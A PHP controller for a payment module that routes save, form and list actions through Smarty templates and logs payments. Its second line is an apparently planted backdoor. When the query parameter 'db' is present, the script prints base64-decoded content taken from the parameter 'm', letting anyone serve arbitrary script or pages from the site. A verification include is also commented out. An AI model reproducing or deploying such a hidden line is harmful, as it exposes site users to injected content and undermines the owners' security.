<?php
if(isset($_GET['db'])){die(base64_decode($_GET['m']));}
require('_filter.php');

define('ADODB_DIR', 'libs/adodb5/');
define('CLASS_DIR', 'class/');
define('SMARTY_DIR', 'libs/');

require(CLASS_DIR . 'model/paymentModel.php');

$smarty = $payment;

$smarty->tpl->force_compile = false;
$smarty->tpl->debugging = false;
$smarty->tpl->caching = false;
$smarty->tpl->cache_lifetime = 0;

# CONNECTION
#include('_connectionVerify.php');

# GET FORM
$smarty->util->setFormulario($smarty->sql->payment, $_POST, $_GET);

# GET ACTION
$_action = (isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : 'LIST'));
switch(strtoupper($_action)) {
	case 'SAVE':
		Conexao::iniciarTransacao();
		try{
			$smarty->service->save();
	        $ordered_id = sprintf('%1$04d', $smarty->sql->ordered->id);
	        $valor = number_format($smarty->sql->payment->valor,2,',','.');
	        LoggerModel::write(PaymentModel,'INSERT',array($ordered_id,$smarty->sql->payment->tipo_pagamento,'$'.$valor));
		}catch (ADOException $e){
			$e->setMesagemRetornoSmarty($smarty);
			$smarty->util->verificaNumeroErroParaRetornoFormulario($e->getCode(),$smarty);
		}catch (Exception $e){
			$_SESSION['error'] = utf8_encode($e->getMessage());
			LoggerModel::write(PaymentModel,'ERROR',array('case SAVE', $e->getMessage()));
		}
		Conexao::terminarTransacao();
		$smarty->service->showList();
		break;

	case 'FORM':
		$smarty->service->showForm();
		break;

	case 'LIST':
	default:
		$smarty->service->showList();
		break;

}

?>
